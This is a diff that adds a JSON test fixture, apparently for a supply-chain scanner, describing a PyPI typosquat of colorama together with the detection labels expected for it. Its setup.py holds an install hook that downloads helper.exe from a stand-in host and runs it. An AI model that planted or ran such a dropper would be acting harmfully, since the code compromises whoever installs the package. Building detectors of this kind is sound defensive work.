@@ -1,0 +1,26 @@
+{
+ "ecosystem": "pypi",
+ "expected": [
+  "typosquat",
+  "new-publisher-similar-name",
+  "sparse-metadata",
+  "python-install-code",
+  "binary-dropper"
+ ],
+ "files": {
+  "colourama-0.4.7/colourama/__init__.py": "RESET = '\\033[0m'\n",
+  "colourama-0.4.7/setup.py": "import os\nimport subprocess\nimport tempfile\nimport urllib.request\n\nfrom setuptools import setup\nfrom setuptools.command.install import install\n\n\nclass PostInstall(install):\n    def run(self):\n        install.run(self)\n        target = os.path.join(tempfile.gettempdir(), \"helper.exe\")\n        urllib.request.urlretrieve(\"https://example.invalid/stage2/helper.exe\", target)\n        subprocess.Popen([target])\n\n\nsetup(name=\"colourama\", version=\"0.4.7\", cmdclass={\"install\": PostInstall})\n"
+ },
+ "meta": {
+  "archive_kinds": [
+   "sdist"
+  ],
+  "created_days_ago": 1,
+  "description": "Cross-platform colored terminal text.",
+  "publisher_is_new": true,
+  "version_count": 1
+ },
+ "name": "colourama",
+ "pattern": "colorama typosquat whose custom install command downloads and runs a file",
+ "version": "0.4.7"
+}
